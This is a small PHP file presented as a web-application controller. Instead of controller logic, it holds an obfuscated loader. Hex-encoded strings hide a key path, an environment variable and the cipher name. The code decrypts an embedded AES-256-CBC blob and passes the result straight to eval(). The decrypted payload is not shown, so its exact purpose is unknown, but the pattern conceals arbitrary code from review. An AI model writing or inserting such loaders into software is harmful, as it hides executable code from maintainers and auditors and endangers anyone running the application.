<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('96YzOofQa1Ql05VlXgoHfQ==');

$c=base64_decode(

'7DvjnwZtIxdDtU0oh2MT5g26YAfQhfzuM4CSuwkkEBr6oXPNEJrSK+xK8F86i8J1xjnSqP+aOovc' .
'iBDB4XojT8l2Hby+vIG9XHDTlUnPGrviLdOiJHNxZafZThcbc6w7lOdHRVIl+NqzfHxu/7IJIm5S' .
'eo4PiqNmBtjsjD+KEdefo2HxAf8jJOECKcR8BamguYj9ncwhWnKbxvOvoVN2Pqafl+VkIWmlo6Uc' .
'23403Jw3WGQ3Q+eogzjxDrchdSdl4n8zDjjboFgR7VybITQZjQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

